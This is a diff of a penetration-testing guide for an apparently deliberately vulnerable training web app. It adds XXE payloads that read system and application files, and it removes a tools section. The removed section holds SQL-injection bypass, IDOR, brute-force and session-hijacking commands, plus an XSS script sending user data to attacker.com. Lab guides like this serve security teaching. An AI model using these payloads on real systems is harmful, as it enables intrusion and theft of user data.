@@ -256,7 +256,6 @@ app.use(session({
 }));
 ```
 
-IM HERE
 
 #### 11. Verbose Error Messages
 **Location**: All error responses  
@@ -485,7 +484,7 @@ app.post('/api/login', loginLimiter, (req, res) => {
 
 **How to Test:**
 
-**Step 1: Check if Endpoint Accepts XML**
+**Step 1: Login and Test Basic XML**
 
 ```bash
 # Login first
@@ -494,11 +493,11 @@ curl -X POST http://<TARGETIP>:5000/api/login \
   -d '{"username":"thepubco","password":"welcome123"}' \
   -c cookies.txt
 
-# Test basic XML submission
+# Test basic XML submission (note: JSON format with xml field)
 curl -X POST http://<TARGETIP>:5000/api/import-order \
-  -H "Content-Type: application/xml" \
+  -H "Content-Type: application/json" \
   -b cookies.txt \
-  -d '<?xml version="1.0"?><order><customer>Test</customer></order>'
+  -d '{"xml": "<?xml version=\"1.0\"?><order><customer>Test</customer></order>"}'
 ```
 
 **Step 2: Test XXE - Read System Files**
@@ -506,31 +505,38 @@ curl -X POST http://<TARGETIP>:5000/api/import-order \
 ```bash
 # Attempt to read /etc/passwd
 curl -X POST http://<TARGETIP>:5000/api/import-order \
-  -H "Content-Type: application/xml" \
+  -H "Content-Type: application/json" \
   -b cookies.txt \
-  -d '<?xml version="1.0"?>
-<!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<order>
-  <customer>&xxe;</customer>
-</order>'
+  -d '{"xml": "<?xml version=\"1.0\"?><!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><order><customer>&xxe;</customer></order>"}'
 ```
 
 **Step 3: Test XXE - Read Application Files**
 
 ```bash
-# Read package.json
+# Read package.json (adjust path as needed)
 curl -X POST http://<TARGETIP>:5000/api/import-order \
-  -H "Content-Type: application/xml" \
+  -H "Content-Type: application/json" \
   -b cookies.txt \
-  -d '<?xml version="1.0"?>
-<!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file:///app/package.json">
-]>
-<order>
-  <customer>&xxe;</customer>
-</order>'
+  -d '{"xml": "<?xml version=\"1.0\"?><!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///app/package.json\">]><order><customer>&xxe;</customer></order>"}'
+```
+
+**Step 4: Using Firefox Developer Tools**
+
+1. Login to the application
+2. Press **F12** and go to **Console** tab
+3. Test XXE with JavaScript:
+
+```javascript
+// Basic XXE test
+fetch('/api/import-order', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    xml: '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><customer>&xxe;</customer></order>'
+  })
+})
+.then(r => r.json())
+.then(data => console.log('XXE Response:', data))
 ```
 
 **Expected Result:**
@@ -610,314 +616,6 @@ curl http://<TARGETIP>:5000/robots.txt
 - Never commit secrets to Git
 - Use proper access controls
 
----
-
-## Penetration Testing Tools Reference
-
-This section provides setup and usage instructions for tools to test the vulnerabilities above. The README.md already covered Firefox Developer Tools, Burp Suite basics, and SQLmap for SQL injection.
-
-### 1. Burp Suite Intruder (Advanced)
-
-**Purpose**: Automated payload testing  
-**Best for**: Rate limiting tests, brute force demonstrations
-
-**Note**: Basic Burp Suite setup was covered in README.md
-
-**Using Intruder for Rate Limiting Test:**
-
-1. Capture a login request in Burp Proxy
-2. Right-click → **Send to Intruder**
-3. Go to **Intruder** tab → **Positions**
-4. Click **Clear §** to remove markers
-5. Select the password value → Click **Add §**
-6. Go to **Payloads** tab
-7. Set **Payload type**: Numbers
-8. Set range: 1 to 100
-9. Click **Start attack**
-10. Observe all requests succeed (no rate limiting)
-
-**Using Sequencer for Session Analysis:**
-
-1. Login/logout multiple times in Burp Proxy
-2. Find login responses with `Set-Cookie` headers
-3. Right-click → **Send to Sequencer**
-4. Click **Start live capture**
-5. Perform 20+ logins
-6. Click **Analyse now**
-7. Observe poor randomness in session tokens
-
-### 2. OWASP ZAP (Zed Attack Proxy)
-
-**Purpose**: Automated vulnerability scanning  
-**Best for**: Quick reconnaissance, generating reports
-
-**Installation:**
-```bash
-# Ubuntu/Debian
-sudo apt install zaproxy
-
-# macOS
-brew install --cask owasp-zap
-```
-
-**Quick Automated Scan:**
-
-1. Open ZAP
-2. **Automated Scan** → Enter: `http://<TARGETIP>:5000`
-3. **Attack** → Select all scan policies
-4. **Start Scan**
-5. Review **Alerts** tab after completion
-6. **Report** → **Generate HTML Report**
-
-**Expected Findings:**
-- SQL Injection in login form
-- Missing CSRF tokens
-- Weak session cookies
-- XSS vulnerabilities
-- Verbose error messages
-
-### 3. Cookie Editor (Firefox Extension)
-
-**Purpose**: Manipulate session cookies  
-**Best for**: Session hijacking tests
-
-**Installation:**
-1. Visit: https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/
-2. Click **Add to Firefox**
-
-**Testing Session Hijacking:**
-
-1. Login as `thepubco` / `welcome123`
-2. Click the **Cookie Editor** icon in toolbar
-3. Find cookie: `connect.sid=sess_1000_1699876543`
-4. Note the pattern (sequential counter)
-5. Logout and login as `bella_italia`
-6. Open Cookie Editor again
-7. Change the session ID to predict another user's session:
-   - Try: `sess_1000_1699876543` (thepubco's session)
-8. Click **Save**
-9. Refresh the page
-10. You're now logged in as thepubco!
-
-### 4. Nikto - Web Server Scanner
-
-**Purpose**: Server reconnaissance  
-**Best for**: Finding misconfigurations, missing security headers
-
-**Installation:**
-```bash
-sudo apt install nikto     # Ubuntu/Debian
-brew install nikto         # macOS
-```
-
-**Basic Scan:**
-```bash
-nikto -h http://<TARGETIP>:5000 -o nikto-report.html -Format html
-```
-
-**Expected Findings:**
-- Missing security headers (X-Frame-Options, CSP)
-- Information disclosure
-- Insecure cookie flags
-
-### 5. Useful Firefox Extensions
-
-**Wappalyzer** - Technology detection
-- Install: https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/
-- Expected results: React, Express.js, Tailwind CSS, Node.js
-
-**FoxyProxy Standard** - Quick proxy switching
-- Install: https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/
-- Setup: Add proxy "Burp" at 127.0.0.1:8080
-- Toggle on/off for easy Burp Suite switching
-
----
-
-### 6. curl - Command-Line Testing
-
-**Purpose**: Quick API endpoint testing, scripting attacks  
-**Best for**: Automation, IDOR testing, bypass testing
-
-**Manchester Fresh Foods Examples:**
-
-**Test 1: SQL Injection in Login**
-```bash
-# Authentication bypass
-curl -X POST http://<TARGETIP>:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' \
-  -c cookies.txt \
-  -v
-
-# Check if logged in
-curl http://<TARGETIP>:5000/api/user \
-  -b cookies.txt
-```
-
-**Test 2: IDOR - Access Other User's Orders**
-```bash
-# Login as thepubco
-curl -X POST http://<TARGETIP>:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"thepubco","password":"welcome123"}' \
-  -c thepubco-cookies.txt
-
-# Get thepubco's orders
-curl http://<TARGETIP>:5000/api/orders \
-  -b thepubco-cookies.txt \
-  | jq '.[] | .id'  # Note the order UUIDs
-
-# Login as bella_italia
-curl -X POST http://<TARGETIP>:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"bella_italia","password":"pasta2024"}' \
-  -c bella-cookies.txt
-
-# Access thepubco's order using bella's session!
-curl http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID \
-  -b bella-cookies.txt
-```
-
-**Test 3: XSS Payload Injection**
-```bash
-# Inject XSS into profile bio
-curl -X POST http://<TARGETIP>:5000/api/profile \
-  -H "Content-Type: application/json" \
-  -b cookies.txt \
-  -d '{"bio":"<script>alert(document.cookie)</script>","phone":"123-456-7890"}'
-```
-
-**Test 4: Rate Limiting Test**
-```bash
-# Attempt 100 login requests (no rate limiting!)
-for i in {1..100}; do
-  curl -X POST http://<TARGETIP>:5000/api/login \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":"test'$i'"}' \
-    -s -o /dev/null -w "%{http_code}\n"
-done
-```
-
----
-
-### 7. Firefox Developer Tools (Built-in)
-
-**How to Open**: Press **F12** or right-click → "Inspect"
-
-**Purpose**: Client-side testing, JavaScript analysis, network inspection  
-**Best for**: XSS testing, session analysis, exposed secrets
-
-**Firefox DevTools Tabs:**
-- **Inspector**: View and edit HTML/CSS (like Chrome's Elements)
-- **Console**: Execute JavaScript, view errors and logs
-- **Debugger**: View JavaScript source files (like Chrome's Sources)
-- **Network**: Monitor HTTP requests and responses
-- **Storage**: View cookies, localStorage, sessionStorage (like Chrome's Application)
-
-**Manchester Fresh Foods Examples:**
-
-**Test 1: Stored XSS**
-```
-1. Navigate to /dashboard/profile in Firefox
-2. Press F12 to open Developer Tools
-3. In the bio field, enter this payload:
-   <img src=x onerror=alert('XSS')>
-4. Save the profile
-5. Refresh the page - observe the XSS alert!
-
-More dangerous payload (credential theft):
-<script>
-  fetch('/api/user').then(r=>r.json()).then(u=>
-    fetch('https://attacker.com/steal?data='+JSON.stringify(u))
-  )
-</script>
-```
-
-**Test 2: Session Cookie Analysis**
-```
-1. Press F12 to open Firefox Developer Tools
-2. Go to the Storage tab
-3. Expand Cookies → http://<TARGETIP>:5000
-4. Find the connect.sid cookie
-5. Check for security issues:
-   ❌ Missing HttpOnly flag (allows JavaScript access)
-   ❌ Missing Secure flag (sent over HTTP)
-   ❌ Missing SameSite attribute (CSRF vulnerable)
-   ❌ Predictable session ID pattern (sess_1000_timestamp)
-
-Alternative - Console tab:
-document.cookie  // If HttpOnly is missing, cookie is visible here!
-```
-
-**Test 3: Exposed Secrets in Source Code**
-```
-1. Press F12 to open Firefox Developer Tools
-2. Go to the Debugger tab
-3. Press Ctrl+Shift+F to open "Search in all files"
-4. Search for sensitive keywords:
-   - "api_key"
-   - "secret"
-   - "password"
-   - "token"
-   - "SESSION_SECRET"
-5. Check for exposed credentials in JavaScript bundles
-```
-
-**Test 4: IDOR via Console**
-```javascript
-// Press F12, go to Console tab
-// Paste and run these commands:
-
-// Get another user's order (replace UUID with one captured earlier)
-fetch('/api/orders/UUID_FROM_OTHER_USER')
-  .then(r => r.json())
-  .then(data => console.log('STOLEN ORDER:', data))
-
-// Get another user's profile  
-fetch('/api/profile/DIFFERENT_USER_ID')
-  .then(r => r.json())
-  .then(data => console.log('STOLEN PROFILE:', data))
-```
-
-**Test 5: Network Tab Analysis**
-```
-1. Press F12, go to Network tab
-2. Navigate around the application
-3. Look for:
-   - API endpoints being called (filter by XHR)
-   - Sensitive data in responses
-   - Session tokens in headers
-   - Unencrypted data transmission
-4. Right-click any request → "Edit and Resend" to modify and replay
-```
-
----
-
-### 8. Postman / Insomnia - API Testing
-
-**Purpose**: Structured API testing, collection building  
-**Best for**: Testing authenticated endpoints, building attack workflows
-
-**Manchester Fresh Foods Collection:**
-
-Create a Postman collection with these requests:
-
-```
-1. Login (POST /api/login)
-   - Save session cookie automatically
-   
-2. Get Current User (GET /api/user)
-   - Uses saved session
-   
-3. Get Orders (GET /api/orders)
-   - Test IDOR by manually changing order IDs
-   
-4. Search Products (GET /api/products/search?query=')
-   - SQL injection payloads in query parameter
-   
-5. Update Profile (POST /api/profile)
-   - XSS payloads in bio field
-```
 
 ---
 
